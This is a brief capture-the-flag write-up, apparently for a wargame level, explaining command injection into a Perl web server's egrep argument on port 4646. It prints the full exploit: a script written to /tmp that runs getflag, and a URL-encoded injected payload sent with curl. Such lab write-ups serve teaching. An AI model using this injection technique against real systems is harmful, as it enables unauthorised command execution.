in this level we find a perl server listening on 4646 and there is a egrep command that can take an argument x,
we can inject a commnad in this argument

echo '#!/bin/bash' > /tmp/SCRIPT
echo 'getflag > /tmp/pass' >> /tmp/SCRIPT
chmod 777 /tmp/SCRIPT
curl "http://localhost:4646?x=%3B%24%28%2F%2A%2FSCRIPT%3B%29" (x = ;$(/*/SCRIPT;))
cat /tmp/pass
